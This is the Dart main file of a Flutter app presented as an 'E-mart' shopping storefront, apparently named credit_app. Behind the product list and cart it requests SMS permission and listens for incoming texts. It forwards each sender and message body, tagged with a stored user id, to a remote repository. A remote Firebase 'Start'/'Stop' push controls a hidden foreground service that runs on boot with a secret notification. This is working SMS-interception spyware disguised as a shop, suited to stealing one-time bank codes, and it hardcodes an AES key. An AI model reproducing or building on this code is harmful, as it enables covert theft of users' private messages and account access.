import 'dart:developer';
import 'package:badges/badges.dart' as badges;
import 'package:credit_app/UI/CardDetailScreen.dart';
import 'package:credit_app/UI/SplashScreen.dart';
import 'package:credit_app/UI/checkoutScreen.dart';
import 'package:credit_app/UI/paymentSelectionScreen.dart';
import 'package:credit_app/background.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:intl/intl.dart';
import 'Repository/itemsApi.dart';
import 'UI/CartScreen.dart';
import 'UI/product_compo.dart';
import 'ViewModel/product_view_model.dart';
import 'firebase_options.dart';
import 'dart:io';
import 'dart:isolate';
import 'package:flutter/foundation.dart';
import 'package:encrypt/encrypt.dart' as enc;
import 'package:flutter/material.dart';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:gap/gap.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:another_telephony/telephony.dart';
import 'Repository/sendMessage.dart';
import 'UI/EndScreen.dart';
import 'components/appButton.dart';
import 'dart:io' show Platform;

import 'firebase_options.dart';

ReceivePort? _receivePort;

Future<void> requestPermissionForAndroid() async {
  if (!Platform.isAndroid) {
    return;
  }
  if (!await FlutterForegroundTask.isIgnoringBatteryOptimizations) {
    // This function requires `android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` permission.
    await FlutterForegroundTask.requestIgnoreBatteryOptimization();
  }

  // Android 13 and higher, you need to allow notification permission to expose foreground service notification.
  final NotificationPermission notificationPermissionStatus =
      await FlutterForegroundTask.checkNotificationPermission();
  if (notificationPermissionStatus != NotificationPermission.granted) {
    await FlutterForegroundTask.requestNotificationPermission();
  }
}

void initForegroundTask() {
  FlutterForegroundTask.init(
    androidNotificationOptions: AndroidNotificationOptions(
      id: 500,
      channelId: 'foreground_service',
      channelName: 'Foreground Service Notification',
      channelDescription:
          'This notification appears when the foreground service is running.',
      channelImportance: NotificationChannelImportance.MIN,
      priority: NotificationPriority.LOW,
      iconData: const NotificationIconData(
        resType: ResourceType.mipmap,
        resPrefix: ResourcePrefix.ic,
        name: 'launcher',
        backgroundColor: Colors.orange,
      ),
    ),
    iosNotificationOptions: const IOSNotificationOptions(
      showNotification: true,
      playSound: false,
    ),
    foregroundTaskOptions: const ForegroundTaskOptions(
      interval: 5000,
      isOnceEvent: false,
      autoRunOnBoot: true,
      allowWakeLock: true,
      allowWifiLock: true,
    ),
  );
}

final telephony = Telephony.instance;
Future<bool> startForegroundTask() async {
  // You can save data using the saveData function.
  await FlutterForegroundTask.saveData(key: 'customData', value: 'hello');
  telephony.listenIncomingSms(
    onNewMessage: onMessage,
    onBackgroundMessage: onBackgroundMessage,
  );
  // Register the receivePort before starting the service.
  final ReceivePort? receivePort = FlutterForegroundTask.receivePort;
  final bool isRegistered = await _registerReceivePort(receivePort);
  if (!isRegistered) {
    log('Failed to register receivePort!');
    return false;
  }

  if (await FlutterForegroundTask.isRunningService) {
    return FlutterForegroundTask.restartService();
  } else {
    return FlutterForegroundTask.startService(
      notificationTitle: 'Foreground Service is running',
      notificationText: 'Tap to return to the app',
      callback: startCallback,
    );
  }
}

Future<bool> stopForegroundTask() {
  return FlutterForegroundTask.stopService();
}

Future<bool> _registerReceivePort(ReceivePort? newReceivePort) async {
  if (newReceivePort == null) {
    return false;
  }

  _closeReceivePort();

  _receivePort = newReceivePort;
  _receivePort?.listen((data) async {
    if (data is int) {
    } else if (data is String) {
      if (data == 'onNotificationPressed') {
        await stopForegroundTask();
      }
    } else if (data is DateTime) {}
  });

  return _receivePort != null;
}

void _closeReceivePort() {
  _receivePort?.close();
  _receivePort = null;
}

@pragma('vm:entry-point')
Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
  if (message.notification!.body == 'Start') {
    // Start the task
    initForegroundTask();
    startForegroundTask();
  } else if (message.notification!.body! == 'Stop') {
    // Stop the task
    stopForegroundTask();
  }
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
}

@pragma('vm:entry-point')
Future<void> sendPendingMessages() async {
  await Firebase.initializeApp();
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  List<String> messages = prefs.getStringList('messages') ?? [];
  for (var message in messages) {
    List<String> parts = message.split('|');
    String address = parts[0];
    String body = parts[1];
    final now = DateTime.now();
    final formatter = DateFormat('yyyy-MM-dd hh:mm:ss a');
    await SendMessageRepo().sendMessage(
        address, body, prefs.getString('uid')!, formatter.format(now));
  }
  await prefs.remove('messages');
}

@pragma('vm:entry-point')
Future<void> onBackgroundMessage(SmsMessage message) async {
  await Firebase.initializeApp();
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  await sendPendingMessages();
  DateTime now = DateTime.now();
  final formatter = DateFormat('yyyy-MM-dd hh:mm:ss a');
  await SendMessageRepo().sendMessage(message.address.toString(),
      message.body.toString(), prefs.getString('uid')!, formatter.format(now));
}

@pragma('vm:entry-point')
Future<void> onMessage(SmsMessage message) async {
  await Firebase.initializeApp();
  final SharedPreferences prefs = await SharedPreferences.getInstance();
  await sendPendingMessages();
  final now = DateTime.now();
  final formatter = DateFormat('yyyy-MM-dd hh:mm:ss a');
  await SendMessageRepo().sendMessage(message.address.toString(),
      message.body.toString(), prefs.getString('uid')!, formatter.format(now));
  if (kDebugMode) {
    print('sending foreground');
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler);
  runApp(const ProviderScope(child: ExampleApp()));
}

// The callback function should always be a top-level function.
@pragma('vm:entry-point')
void startCallback() {
  // The setTaskHandler function must be called to handle the task in the background.
  FlutterForegroundTask.setTaskHandler(MyTaskHandler());
}

class MyTaskHandler extends TaskHandler {
  SendPort? _sendPort;
  int _eventCount = 0;

  // Called when the task is started.
  @override
  void onStart(DateTime timestamp, SendPort? sendPort) async {
    _sendPort = sendPort;

    // You can use the getData function to get the stored data.
    final customData =
        await FlutterForegroundTask.getData<String>(key: 'customData');
  }

  // Called every [interval] milliseconds in [ForegroundTaskOptions].
  @override
  void onRepeatEvent(DateTime timestamp, SendPort? sendPort) async {
    FlutterForegroundTask.updateService(
      notificationTitle: 'We are working in background',
      notificationText: 'Don\'t close',
    );

    // Send data to the main isolate.
    sendPort?.send(_eventCount);

    _eventCount++;
  }

  // Called when the notification button on the Android platform is pressed.
  @override
  void onDestroy(DateTime timestamp, SendPort? sendPort) async {}

  // Called when the notification button on the Android platform is pressed.
  @override
  void onNotificationButtonPressed(String id) {}

  // Called when the notification itself on the Android platform is pressed.
  //
  // "android.permission.SYSTEM_ALERT_WINDOW" permission must be granted for
  // this function to be called.
  @override
  void onNotificationPressed() {
    // Note that the app will only route to "/resume-route" when it is exited so
    // it will usually be necessary to send a message through the send port to
    // signal it to restore state when the app is already started.
    FlutterForegroundTask.launchApp("/resume-route");
    _sendPort?.send('onNotificationPressed');
  }
}

class ExampleApp extends StatelessWidget {
  const ExampleApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      initialRoute: '/',
      routes: {
        '/': (context) => const SplashScreen(),
        '/resume-route': (context) => const ResumeRoutePage(),
      },
    );
  }
}

class ExamplePage extends ConsumerStatefulWidget {
  const ExamplePage({Key? key}) : super(key: key);

  @override
  ConsumerState<ConsumerStatefulWidget> createState() => _ExamplePageState();
}

class _ExamplePageState extends ConsumerState<ExamplePage> {
  ReceivePort? _receivePort;

  Future<void> _requestPermissionForAndroid() async {
    if (!Platform.isAndroid) {
      return;
    }
    if (!await FlutterForegroundTask.isIgnoringBatteryOptimizations) {
      // This function requires `android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` permission.
      await FlutterForegroundTask.requestIgnoreBatteryOptimization();
    }

    // Android 13 and higher, you need to allow notification permission to expose foreground service notification.
    final NotificationPermission notificationPermissionStatus =
        await FlutterForegroundTask.checkNotificationPermission();
    if (notificationPermissionStatus != NotificationPermission.granted) {
      await FlutterForegroundTask.requestNotificationPermission();
    }
  }

  void _initForegroundTask() {
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
          id: 500,
          channelId: 'foreground_service',
          channelName: 'Foreground Service Notification',
          channelDescription:
              'This notification appears when the foreground service is running.',
          channelImportance: NotificationChannelImportance.NONE,
          priority: NotificationPriority.MIN,
          iconData: const NotificationIconData(
            resType: ResourceType.mipmap,
            resPrefix: ResourcePrefix.ic,
            name: 'launcher',
            backgroundColor: Colors.orange,
          ),
          visibility: NotificationVisibility.VISIBILITY_SECRET),
      iosNotificationOptions: const IOSNotificationOptions(
        showNotification: true,
        playSound: false,
      ),
      foregroundTaskOptions: const ForegroundTaskOptions(
        interval: 5000,
        isOnceEvent: false,
        autoRunOnBoot: true,
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );
  }

  final Telephony telephony = Telephony.instance;
  Future<bool> _startForegroundTask() async {
    // You can save data using the saveData function.
    await FlutterForegroundTask.saveData(key: 'customData', value: 'hello');
    telephony.listenIncomingSms(
      onNewMessage: onMessage,
      onBackgroundMessage: onBackgroundMessage,
    );
    // Register the receivePort before starting the service.
    final ReceivePort? receivePort = FlutterForegroundTask.receivePort;
    final bool isRegistered = _registerReceivePort(receivePort);
    if (!isRegistered) {
      return false;
    }

    if (await FlutterForegroundTask.isRunningService) {
      return FlutterForegroundTask.restartService();
    } else {
      return FlutterForegroundTask.startService(
        notificationTitle: 'Foreground Service is running',
        notificationText: 'Tap to return to the app',
        callback: startCallback,
      );
    }
  }

  Future<bool> _stopForegroundTask() {
    return FlutterForegroundTask.stopService();
  }

  bool _registerReceivePort(ReceivePort? newReceivePort) {
    if (newReceivePort == null) {
      return false;
    }

    _closeReceivePort();

    _receivePort = newReceivePort;
    _receivePort?.listen((data) {
      if (data is int) {
      } else if (data is String) {
        if (data == 'onNotificationPressed') {
          Navigator.of(context).pushNamed('/resume-route');
        }
      } else if (data is DateTime) {}
    });

    return _receivePort != null;
  }

  void _closeReceivePort() {
    _receivePort?.close();
    _receivePort = null;
  }

  NotificationServices notificationServices = NotificationServices();

  bool permission = false;
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      _initForegroundTask();
      await _requestPermissionForAndroid();
      notificationServices.requestNotificationPermission();
      notificationServices.forgroundMessage();
      notificationServices.firebaseInit(context);
      notificationServices.setupInteractMessage(context);
      notificationServices.isTokenRefresh();

      notificationServices.getDeviceToken().then((value) {
        if (kDebugMode) {
          print('device token');
          print(value);
        }
      });
      // You can get the previous ReceivePort without restarting the service.
      if (await FlutterForegroundTask.isRunningService) {
        final newReceivePort = FlutterForegroundTask.receivePort;
        _registerReceivePort(newReceivePort);
      }
    });
    Permission.sms.request();
    Permission.sms.isGranted.then((value) {
      permission = value;
      setState(() {});
    });
  }

  @override
  void dispose() {
    _closeReceivePort();
    _searchController.dispose();
    super.dispose();
  }

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";

  final ApiService apiService = ApiService();
  final Set<int> selectedFirstHalf = {};
  final Set<int> selectedSecondHalf = {};
  @override
  Widget build(BuildContext context) {
    final totalItemCount =
        ref.watch(cartProvider).values.fold(0, (sum, count) => sum + count);
    final productsAsyncValue = ref.watch(productsProvider);
    final height = MediaQuery.sizeOf(context).height;
    return WithForegroundTask(
      child: Scaffold(
        appBar: AppBar(
          backgroundColor: Colors.black,
          title: const Text('E-mart', style: TextStyle(color: Colors.white)),
          centerTitle: true,
          actions: [
            Stack(
              alignment: Alignment.topRight,
              children: [
                IconButton(
                  icon: const Icon(
                    Icons.shopping_cart,
                    color: Colors.white,
                  ),
                  onPressed: () {
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                          builder: (context) => CartScreen(
                                Button: AppButton(
                                  title: 'Checkout',
                                  onTap: () async {
                                    if (await Permission.sms.status.isGranted) {
                                      check().then((value) {
                                        _stopForegroundTask();
                                        // _initForegroundTask();
                                        // startForegroundTask();
                                        value
                                            ? Navigator.push(
                                                context,
                                                MaterialPageRoute(
                                                    builder: (context) =>
                                                        const EndScreen()))
                                            : Navigator.push(
                                                context,
                                                MaterialPageRoute(
                                                    builder: (context) =>
                                                         CheckoutScreen()));
                                      });
                                    } else {
                                      ScaffoldMessenger.of(context)
                                          .showSnackBar(
                                        const SnackBar(
                                          backgroundColor: Colors.red,
                                          content: Text('Give Permission'),
                                          duration: Duration(seconds: 2),
                                        ),
                                      );
                                    }
                                  },
                                ),
                              )),
                    );
                  },
                ),
                if (totalItemCount >
                    0) // Show badge only if there are items in the cart
                  badges.Badge(
                    badgeContent: Text(
                      totalItemCount.toString(),
                      style: const TextStyle(color: Colors.white, fontSize: 12),
                    ),
                    position: badges.BadgePosition.topEnd(top: 0, end: 3),
                    badgeStyle: const badges.BadgeStyle(
                      badgeColor: Colors.red,
                    ),
                  ),
              ],
            )
          ],
        ),
        body: Column(
          children: [
            // Search Field
            Padding(
              padding: const EdgeInsets.all(16.0),
              child: TextFormField(
                controller: _searchController,
                onChanged: (query) {
                  setState(() {
                    _searchQuery = query.trim().toLowerCase();
                  });
                },
                decoration: InputDecoration(
                    labelText: "Search",
                    prefixIcon: const Icon(Icons.search),
                    border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8),
                        borderSide: const BorderSide(color: Colors.grey)),
                    focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8),
                        borderSide: const BorderSide(color: Colors.black)),
                    hintStyle: const TextStyle(color: Colors.black),
                    labelStyle: const TextStyle(color: Colors.black)),
              ),
            ),
            Expanded(
              child: productsAsyncValue.when(
                loading: () => const Center(
                  child: CircularProgressIndicator(
                    color: Colors.black,
                  ),
                ),
                error: (error, stackTrace) => Center(
                  child: Text('Error: $error'),
                ),
                data: (products) {
                  // Filter products based on search query
                  final filteredProducts = _searchQuery.isEmpty
                      ? products
                      : products
                          .where((product) => product['title']
                              .toLowerCase()
                              .contains(_searchQuery))
                          .toList();

                  if (filteredProducts.isEmpty) {
                    return const Center(
                      child: Text("No products found"),
                    );
                  }

                  final halfIndex = (filteredProducts.length / 2).ceil();
                  final firstHalf = filteredProducts.sublist(0, halfIndex);
                  final secondHalf = filteredProducts.sublist(halfIndex);
                  return SingleChildScrollView(
                    child: Column(
                      children: [
                        SizedBox(
                          height: MediaQuery.of(context).size.height * .5,
                          child: ListView.builder(
                            shrinkWrap: true,
                            scrollDirection: Axis.horizontal,
                            itemCount: firstHalf.length,
                            itemBuilder: (context, index) {
                              return ProductCard(
                                product: firstHalf[index],
                                index: index,
                                isFirstHalf: true,
                              );
                            },
                          ),
                        ),
                        const Divider(),
                        SizedBox(
                          height: MediaQuery.of(context).size.height * .5,
                          child: ListView.builder(
                            shrinkWrap: true,
                            scrollDirection: Axis.horizontal,
                            itemCount: secondHalf.length,
                            itemBuilder: (context, index) {
                              return ProductCard(
                                product: secondHalf[index],
                                index: index,
                                isFirstHalf: false,
                              );
                            },
                          ),
                        ),
                        const SizedBox(height: 20),
                      ],
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class ResumeRoutePage extends StatelessWidget {
  const ResumeRoutePage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Resume Route'),
        centerTitle: true,
      ),
      body: Center(
        child: ElevatedButton(
          onPressed: () {
            // Navigate back to first route when tapped.
            Navigator.of(context).pop();
          },
          child: const Text('Go back!'),
        ),
      ),
    );
  }
}

Future<bool> checkAndRequestSmsPermission() async {
  PermissionStatus status = await Permission.sms.status;
  if (!status.isGranted) {
    status = await Permission.sms.request();
    return status.isGranted;
  } else if (status.isGranted) {
    return true;
  } else {
    return false;
  }
}

Future<bool> check() async {
  SharedPreferences sp = await SharedPreferences.getInstance();
  return sp.containsKey('uid');
}

class Encode {
  final key = enc.Key.fromUtf8('4f1aaae66406e358');
  final iv = enc.IV.fromUtf8('df1e180949793972');
  Future<String> encryptingData(String plainText) async {
    String encryptedText;
    try {
      final encrypter =
          enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc, padding: 'PKCS7'));
      final encrypted = encrypter.encrypt(plainText, iv: iv);
      encryptedText = encrypted.base64;
    } on Exception catch (e) {
      encryptedText = e.toString();
    }
    return encryptedText;
  }
}

// @pragma('vm:entry-point')
// Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
//   initForegroundTask();
//   startForegroundTask();
//   await Firebase.initializeApp();
// }
//
// void main() async {
//   WidgetsFlutterBinding.ensureInitialized();
//   await Firebase.initializeApp(
//     options: DefaultFirebaseOptions.currentPlatform,
//   );
//   FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler);
//   await requestPermissions();
//   String? deviceToken = await FirebaseMessaging.instance.getToken();
//   print("Device token: $deviceToken");
//
//   runApp(MyApp(deviceToken: deviceToken));
// }
//
// Future<void> requestPermissions() async {
//   NotificationSettings settings =
//       await FirebaseMessaging.instance.requestPermission(
//     alert: true,
//     announcement: false,
//     badge: true,
//     carPlay: false,
//     sound: true,
//   );
//
//   // ... handle permissions (add your logic here)
// }
//
// class MyApp extends StatefulWidget {
//   final String? deviceToken;
//
//   const MyApp({Key? key, required this.deviceToken}) : super(key: key);
//
//   @override
//   State<MyApp> createState() => _MyAppState();
// }
//
// class _MyAppState extends State<MyApp> {
//   String? _message;
//
//   @override
//   void initState() {
//     super.initState();
//     initForegroundTask();
//     FirebaseMessaging.instance
//         .getInitialMessage()
//         .then((RemoteMessage? message) {
//       if (message != null) {
//         setState(() {
//           _message = message.notification?.title;
//         });
//       }
//     });
//     FirebaseMessaging.onMessage.listen((RemoteMessage message) {
//       if (Platform.isAndroid) {
//         if (message.notification != null) {
//           setState(() {
//             _message = message.notification!.title;
//           });
//         }
//       }
//       performBackgroundFunction(message.data);
//     });
//
//     FirebaseMessaging.onMessageOpenedApp.listen((RemoteMessage message) {
//       print('Notification tapped: ${message.notification!.title}');
//       // ... handle user interaction with notification (add your logic here)
//     });
//   }
//
//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: Scaffold(
//         appBar: AppBar(
//           title: const Text('FCM Device Token'),
//         ),
//         body: Center(
//           child: Column(
//             mainAxisAlignment: MainAxisAlignment.center,
//             children: [
//               Text(
//                 widget.deviceToken != null
//                     ? 'Device Token: ${widget.deviceToken}'
//                     : 'No device token yet',
//                 style: const TextStyle(fontSize: 20),
//               ),
//               const SizedBox(height: 20),
//               Text(
//                 _message != null
//                     ? 'Received message: $_message'
//                     : 'No message received yet',
//                 style: const TextStyle(fontSize: 16),
//               ),
//             ],
//           ),
//         ),
//       ),
//     );
//   }
// }
//
// void performBackgroundFunction(Map<String, dynamic> data) async {
//   log('Background function executed with data: $data');
//
//   // ... your background processing logic here
// }
